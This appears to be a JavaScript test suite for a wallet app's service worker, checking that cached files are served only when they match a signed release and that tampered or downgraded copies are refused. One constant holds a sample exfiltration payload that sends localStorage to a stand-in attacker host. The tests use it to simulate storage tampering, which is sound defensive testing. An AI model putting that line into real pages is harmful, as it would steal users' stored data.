// The installed worker trusts only signed data for the copy it serves (outside security audit
// 2026-11-18, #6): release.json, release.sig and manifest.json are kept beside the copy and checked
// again each time the worker starts, and every file's hash comes from them. Whoever can write this
// site's storage (Cache Storage) cannot change a file and the hash it is checked against together,
// nor set the copy back to a release made before these checks. Runs the real loader (sw.js as the
// build assembles it) over an in-memory Cache Storage; a "restart" is a second loader over it.
import test from 'node:test';
import assert from 'node:assert/strict';
import { webcrypto, createHash } from 'node:crypto';
import { loadLoader } from './helpers/sw_sandbox.mjs';
import { RELEASE_APP_ID } from '../../src/lib/release.js';

const s = webcrypto.subtle;
const sha = (b) => createHash('sha256').update(b).digest('hex');
const SCOPE = 'https://wallet.example/';

async function signer() {
  const k = await s.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign', 'verify']);
  const j = await s.exportKey('jwk', k.publicKey);
  return { priv: k.privateKey, pub: { kty: j.kty, crv: j.crv, x: j.x, y: j.y } };
}

/** A signed release of `files`, as the address serves it: bytes by path. */
async function served(priv, version, files) {
  const entries = Object.entries(files).map(([path, c]) => ({ path, sha256: sha(Buffer.from(c)), size: Buffer.byteLength(c) }));
  const manifest = Buffer.from(JSON.stringify({ app: RELEASE_APP_ID, version, files: entries }));
  const release = Buffer.from(JSON.stringify({ app: RELEASE_APP_ID, version, created: '2026-11-18T00:00:00.000Z', manifest_sha256: sha(manifest), file_count: entries.length, engine: 'real' }));
  const sig = Buffer.from(await s.sign({ name: 'ECDSA', hash: 'SHA-256' }, priv, release)).toString('base64');
  return { 'release.json': release, 'release.sig': Buffer.from(sig), 'manifest.json': manifest, ...Object.fromEntries(Object.entries(files).map(([p, c]) => [p, Buffer.from(c)])) };
}

/** The network: `site()` gives what the address serves now (null: unreachable). */
const network = (site) => async (url) => {
  const files = site();
  if (!files) throw new TypeError('Failed to fetch');
  const path = url.startsWith(SCOPE) ? url.slice(SCOPE.length) : null;
  if (path === null || !(path in files)) return new Response('not found', { status: 404 });
  return new Response(files[path], { status: 200 });
};

/** A page or file asked of the loader's fetch handler: its response. */
async function get(sw, path, mode = 'navigate') {
  let reply;
  sw.handlers.fetch({ request: { method: 'GET', url: SCOPE + path, mode, destination: mode === 'navigate' ? 'document' : 'script' }, respondWith: (p) => (reply = p) });
  return reply;
}

/** Installs `rel` as the first run does, then returns a loader started again over the same storage. */
async function installed(k, rel, siteNow) {
  const sw = await loadLoader({ pub: k.pub, scope: SCOPE, fetch: network(() => rel) });
  const current = await sw.stageRelease(await sw.fetchVerifiedRelease(new URL(SCOPE)));
  await sw.writeState({ current, pending: null, staging: null });
  return () => loadLoader({ pub: k.pub, scope: SCOPE, fetch: network(siteNow), caches: sw.caches });
}

const FILES = { 'index.html': '<!doctype html><script src="app.js"></script>', 'app.js': 'console.log("wallet")' };
const EVIL = 'fetch("https://attacker.example/?w=" + localStorage)';

test('#6: a copy is served after a restart from its kept signed files', async () => {
  const k = await signer();
  const rel = await served(k.priv, '0.1.24', FILES);
  const restart = await installed(k, rel, () => null); // offline after the install
  const sw = await restart();
  const r = await get(sw, 'app.js', 'no-cors');
  assert.equal(r.status, 200);
  assert.equal(await r.text(), FILES['app.js']);
  const st = await sw.readState();
  assert.equal(st.current.version, '0.1.24');
  assert.equal(st.current.files['app.js'], sha(Buffer.from(FILES['app.js'])));
});

test('#6: a file and its hash both changed in storage are never served: the hash comes from the signed manifest', async () => {
  const k = await signer();
  const rel = await served(k.priv, '0.1.24', FILES);
  const restart = await installed(k, rel, () => null);
  let sw = await restart();
  const st = await sw.readState();
  // The storage writer: the cached file, and the hash the state keeps for it.
  await (await sw.caches.open(st.current.cache)).put(SCOPE + 'app.js', new Response(EVIL));
  const meta = await sw.caches.open(sw.META_CACHE);
  await meta.put(new URL('__campfire_state', SCOPE).href, new Response(JSON.stringify({ ...st, current: { ...st.current, files: { ...st.current.files, 'app.js': sha(Buffer.from(EVIL)) } } })));
  sw = await restart();
  const r = await get(sw, 'app.js', 'no-cors');
  assert.equal(r.status, 500);
  assert.match(await r.text(), /changed on this device/);
  assert.notEqual(await (await get(sw, 'index.html')).text(), EVIL);
});

test('#6: signed files that do not check out (a manifest rewritten in storage) open nothing; the genuine ones from the address mend it', async () => {
  const k = await signer();
  const rel = await served(k.priv, '0.1.24', FILES);
  let online = false;
  const restart = await installed(k, rel, () => (online ? rel : null));
  let sw = await restart();
  const st = await sw.readState();
  const meta = await sw.caches.open(sw.META_CACHE);
  const forged = Buffer.from(JSON.stringify({ app: RELEASE_APP_ID, version: '0.1.24', files: [{ path: 'app.js', sha256: sha(Buffer.from(EVIL)), size: EVIL.length }] }));
  await meta.put(`${SCOPE}__campfire_proof/${st.current.manifestSha}/manifest.json`, new Response(forged));
  await (await sw.caches.open(st.current.cache)).put(SCOPE + 'app.js', new Response(EVIL));
  sw = await restart();
  const r = await get(sw, 'index.html');
  assert.equal(r.status, 500, 'offline: not opened');
  assert.match(await r.text(), /changed on this device/);
  // Online: the release's own signed files come again from its address; the changed file still is not served.
  online = true;
  sw = await restart();
  assert.equal((await get(sw, 'index.html')).status, 200);
  assert.equal((await get(sw, 'app.js', 'no-cors')).status, 500);
});

test('#6: a copy installed by an earlier loader (no signed files kept) gets them from its address once; offline it waits, opening nothing', async () => {
  const k = await signer();
  const rel = await served(k.priv, '0.1.24', FILES);
  let online = false;
  const restart = await installed(k, rel, () => (online ? rel : null));
  let sw = await restart();
  const st = await sw.readState();
  // As an earlier loader left it: the state and the files, no signed files.
  const meta = await sw.caches.open(sw.META_CACHE);
  for (const f of ['release.json', 'release.sig', 'manifest.json']) await meta.delete(`${SCOPE}__campfire_proof/${st.current.manifestSha}/${f}`);
  sw = await restart();
  const r = await get(sw, 'index.html');
  assert.equal(r.status, 503);
  assert.match(await r.text(), /could not reach its address/);
  online = true;
  sw = await restart();
  assert.equal((await get(sw, 'index.html')).status, 200);
  assert.ok(await meta.match(`${SCOPE}__campfire_proof/${st.current.manifestSha}/release.sig`), 'kept for the next start');
  online = false;
  sw = await restart();
  assert.equal((await get(sw, 'index.html')).status, 200, 'and then works offline');
});

test('#6: the copy cannot be set back to a signed release older than MIN_RELEASE, from the address or from storage', async () => {
  const k = await signer();
  const sw0 = await loadLoader({ pub: k.pub, scope: SCOPE, fetch: async () => new Response('', { status: 404 }) });
  assert.equal(sw0.MIN_RELEASE, '0.1.24');
  const old = await served(k.priv, '0.1.23', FILES);
  // A first install from an address serving it: refused.
  const swOld = await loadLoader({ pub: k.pub, scope: SCOPE, fetch: network(() => old) });
  let installing;
  swOld.handlers.install({ waitUntil: (p) => (installing = p) });
  await assert.rejects(installing, (e) => e.code === 'downgrade');
  assert.equal((await swOld.readState()).current, null);
  // An update source that still serves it (a copy behind): nothing newer, never "refused".
  const fine = await served(k.priv, '0.1.24', FILES);
  const restartFine = await installed(k, fine, () => old);
  const swUpd = await restartFine();
  const r = await swUpd.checkUpdate();
  assert.equal(r.result, 'none', JSON.stringify(r));
  // Its genuine signed files written into storage as the installed copy: not opened.
  const rel = await served(k.priv, '0.1.24', FILES);
  const restart = await installed(k, rel, () => null);
  let sw = await restart();
  const meta = await sw.caches.open(sw.META_CACHE);
  const oldSha = sha(old['manifest.json']);
  for (const f of ['release.json', 'release.sig', 'manifest.json']) await meta.put(`${SCOPE}__campfire_proof/${oldSha}/${f}`, new Response(old[f]));
  const st = await sw.readState();
  await meta.put(new URL('__campfire_state', SCOPE).href, new Response(JSON.stringify({ ...st, current: { ...st.current, version: '0.1.23', manifestSha: oldSha } })));
  sw = await restart();
  assert.equal((await get(sw, 'index.html')).status, 500);
  // A loader built for tests that install old versions (--loader-min) takes it.
  const lenient = await loadLoader({ pub: k.pub, scope: SCOPE, fetch: network(() => old), minRelease: '0.0.0' });
  let lenientInstall;
  lenient.handlers.install({ waitUntil: (p) => (lenientInstall = p) });
  await lenientInstall;
  assert.equal((await lenient.readState()).current.version, '0.1.23');
});

test('release audit of 0.1.24: a loader that cannot check the installed copy does not take over; the one in use keeps serving it', async () => {
  const k = await signer();
  const rel = await served(k.priv, '0.1.24', FILES);
  const restart = await installed(k, rel, () => null);
  const sw = await restart();
  const st = await sw.readState();
  // As a 0.1.23 loader left it (no signed files kept), with the address serving another release now.
  const meta = await sw.caches.open(sw.META_CACHE);
  for (const f of ['release.json', 'release.sig', 'manifest.json']) await meta.delete(`${SCOPE}__campfire_proof/${st.current.manifestSha}/${f}`);
  const next = await served(k.priv, '0.1.25', { ...FILES, 'app.js': 'console.log("next")' });
  const newer = await loadLoader({ pub: k.pub, scope: SCOPE, fetch: network(() => next), caches: sw.caches });
  newer.self.registration.active = { scriptURL: `${SCOPE}sw-0123.js` }; // the old loader still serves it
  let installing;
  newer.handlers.install({ waitUntil: (p) => (installing = p) });
  await assert.rejects(installing, 'install refused: the browser keeps the loader in use');
  // Its own release's signed files under proofs/<manifest hash>/ (kept on the address): taken over.
  const withProofs = { ...next };
  for (const f of ['release.json', 'release.sig', 'manifest.json']) withProofs[`proofs/${st.current.manifestSha}/${f}`] = rel[f];
  const mended = await loadLoader({ pub: k.pub, scope: SCOPE, fetch: network(() => withProofs), caches: sw.caches });
  mended.self.registration.active = { scriptURL: `${SCOPE}sw-0123.js` };
  let ok;
  mended.handlers.install({ waitUntil: (p) => (ok = p) });
  await ok;
  assert.equal((await get(mended, 'index.html')).status, 200);
});

test('release audit of 0.1.24: Update waits for a check under way, and never switches to a staged release with files missing', async () => {
  const k = await signer();
  const rel = await served(k.priv, '0.1.24', FILES);
  const next = await served(k.priv, '0.1.25', { ...FILES, 'app.js': 'console.log("next")' });
  const restart = await installed(k, rel, () => next);
  const sw = await restart();
  assert.equal((await sw.checkUpdate()).result, 'ready');
  const st = await sw.readState();
  // A file of the staged release gone from its cache (as when a cleanup removed it under a download).
  await (await sw.caches.open(st.pending.cache)).delete(SCOPE + 'app.js');
  const r = await sw.applyUpdate({ loaderReady: true });
  assert.equal(r.result, 'incomplete');
  assert.equal((await sw.readState()).current.version, '0.1.24', 'still the installed copy');
  assert.equal((await sw.readState()).pending, null, 'checked again next time');
  assert.equal((await sw.checkUpdate()).result, 'ready');
  assert.equal((await sw.applyUpdate({ loaderReady: true })).result, 'applied');
});

test('release audit of 0.1.24: a worker whose stored state is gone fetches nothing unchecked; it lets go', async () => {
  const k = await signer();
  const rel = await served(k.priv, '0.1.24', FILES);
  const restart = await installed(k, rel, () => rel);
  let sw = await restart();
  await (await sw.caches.open(sw.META_CACHE)).delete(new URL('__campfire_state', SCOPE).href);
  sw = await restart();
  let unregistered = false;
  sw.self.registration.unregister = async () => (unregistered = true);
  const fetched = [];
  const r = await get(sw, 'index.html');
  assert.equal(r.status, 503);
  assert.equal(unregistered, true);
  assert.deepEqual(fetched, []);
});

test('release re-audit of 0.1.24: no loader serving a copy this one cannot check (its registration gone, the cache left): a checked copy is installed as on a first open', async () => {
  const k = await signer();
  const rel = await served(k.priv, '0.1.24', FILES);
  const restart = await installed(k, rel, () => null);
  const sw = await restart();
  const st = await sw.readState();
  const meta = await sw.caches.open(sw.META_CACHE);
  for (const f of ['release.json', 'release.sig', 'manifest.json']) await meta.delete(`${SCOPE}__campfire_proof/${st.current.manifestSha}/${f}`);
  const next = await served(k.priv, '0.1.25', { ...FILES, 'app.js': 'console.log("next")' });
  const fresh = await loadLoader({ pub: k.pub, scope: SCOPE, fetch: network(() => next), caches: sw.caches });
  let installing;
  fresh.handlers.install({ waitUntil: (p) => (installing = p) });
  await installing;
  assert.equal((await fresh.readState()).current.version, '0.1.25');
  assert.equal(await (await get(fresh, 'app.js', 'no-cors')).text(), 'console.log("next")');
});

test('release re-audit of 0.1.24: Update while a check is still under way is refused as busy (the check may stage a newer release)', async () => {
  const k = await signer();
  const rel = await served(k.priv, '0.1.24', FILES);
  const next = await served(k.priv, '0.1.25', { ...FILES, 'app.js': 'console.log("next")' });
  const restart = await installed(k, rel, () => next);
  const sw = await restart();
  assert.equal((await sw.checkUpdate()).result, 'ready');
  // A second check under way (through the message the page sends), then Update.
  let answer;
  const waits = [];
  sw.handlers.message({ data: { type: 'check-update' }, ports: [{ postMessage: (m) => (answer = m) }], waitUntil: (p) => waits.push(p) });
  let applied;
  sw.handlers.message({ data: { type: 'apply-update', loaderReady: true }, ports: [{ postMessage: (m) => (applied = m) }], waitUntil: (p) => waits.push(p) });
  await Promise.all(waits);
  assert.equal(applied.result, 'busy');
  assert.ok(answer);
  assert.equal((await sw.applyUpdate({ loaderReady: true })).result, 'applied');
});
